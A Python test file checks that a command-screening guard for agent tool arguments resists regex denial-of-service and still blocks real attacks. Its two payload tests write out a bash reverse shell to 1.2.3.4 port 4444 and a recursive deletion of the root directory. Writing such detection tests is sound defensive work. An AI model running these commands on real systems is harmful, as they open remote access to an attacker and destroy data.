"""ReDoS resistance: adversarial inputs must stay linear and fast.

Bound is 50 ms per inspection (the TS suite uses the same limit), measured on
the local machine.  Each adversarial case must also still fail open-free: a
real payload appended after the padding is still blocked.
"""

import time

import pytest

from correctover_guard_ref.rules import inspect_tool_arguments

TIME_BUDGET_MS = 50.0


def _timed(args):
    t0 = time.perf_counter()
    result = inspect_tool_arguments(args)
    elapsed_ms = (time.perf_counter() - t0) * 1000.0
    return result, elapsed_ms


ADVERSARIAL = [
    {"command": "rm " + " -r" * 5000 + " ./cache"},
    {"command": "rm " + "-" * 100_000},
    {"command": "`" + "/" * 100_000},
    {"command": "curl " * 40_000},
    {"command": "cat " * 50_000},
    {"command": "nc " * 60_000},
    {"command": "/dev/tcp/" * 20_000},
]


@pytest.mark.parametrize("args", ADVERSARIAL)
def test_adversarial_inputs_are_fast_and_clean(args):
    result, elapsed_ms = _timed(args)
    assert elapsed_ms < TIME_BUDGET_MS, "took %.1f ms" % elapsed_ms
    # Padded benign-looking commands must not be blocked.
    assert result is None


def test_real_payload_after_padding_still_denied_tcp():
    payload = "/dev/tcp/" * 100 + "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
    result, elapsed_ms = _timed({"command": payload})
    assert result == "reverse-shell"
    assert elapsed_ms < TIME_BUDGET_MS


def test_real_payload_after_padding_still_denied_rm():
    payload = "rm " + "-r" * 2500 + " /"
    result, elapsed_ms = _timed({"command": payload})
    assert result == "force-delete-root"
    assert elapsed_ms < TIME_BUDGET_MS
